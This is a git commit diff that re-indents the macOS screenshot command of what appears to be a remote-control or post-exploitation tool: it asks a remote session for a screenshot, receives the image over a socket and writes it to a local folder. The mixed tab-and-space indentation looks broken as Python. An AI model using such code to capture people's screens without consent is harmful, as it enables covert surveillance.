86a428cde873081b8e75436429eb8d1542036588
Ivan Nikolsky <54115104+enty8080@users.noreply.github.com>
2020-04-08 11:46:55 +0300

    Update screenshot_macos.py

--- core/commands/macos/screenshot_macos.py
+++ core/commands/macos/screenshot_macos.py
@@ -38,25 +38,25 @@ class command:
 		dest = cmd_data['args'][0]
                 if os.path.isdir(dest):
                     if os.path.exists(dest):
-			 h.info_general("Taking screenshot...")
-			 result = json.loads(session.send_command(cmd_data))
-    			 if 'error' in result:
-    	    		     h.info_error("Failed to take screenshot!")
-            		     return
-    			 elif 'size' in result:
-	    		     size = int(result['size'])
-	    		     data = session.sock_receive_data(size)
-	    		     f = open(os.path.join(dest,'screenshot.jpg'),'w')
-	    		     f.write(data)
-	    		     f.close()
-                         if dest[-1:] == "/":
-                             h.info_general("Saving to "+dest+"screenshot.jpg...")
-                             time.sleep(1)
-                             h.info_success("Saved to "+dest+"screenshot.jpg!")
-                         else:
-                             h.info_general("Saving to "+dest+"/screenshot.jpg...")
-                             time.sleep(1)
-                             h.info_success("Saved to "+dest+"/screenshot.jpg!")
+		        h.info_general("Taking screenshot...")
+			result = json.loads(session.send_command(cmd_data))
+    			if 'error' in result:
+    	    		    h.info_error("Failed to take screenshot!")
+            		    return
+    			elif 'size' in result:
+	    		    size = int(result['size'])
+	    		    data = session.sock_receive_data(size)
+	    		    f = open(os.path.join(dest,'screenshot.jpg'),'w')
+	    		    f.write(data)
+	    		    f.close()
+                        if dest[-1:] == "/":
+                            h.info_general("Saving to "+dest+"screenshot.jpg...")
+                            time.sleep(1)
+                            h.info_success("Saved to "+dest+"screenshot.jpg!")
+                        else:
+                            h.info_general("Saving to "+dest+"/screenshot.jpg...")
+                            time.sleep(1)
+                            h.info_success("Saved to "+dest+"/screenshot.jpg!")
                     else:
                         h.info_error("Local directory: "+dest+": does not exist!")
                 else:
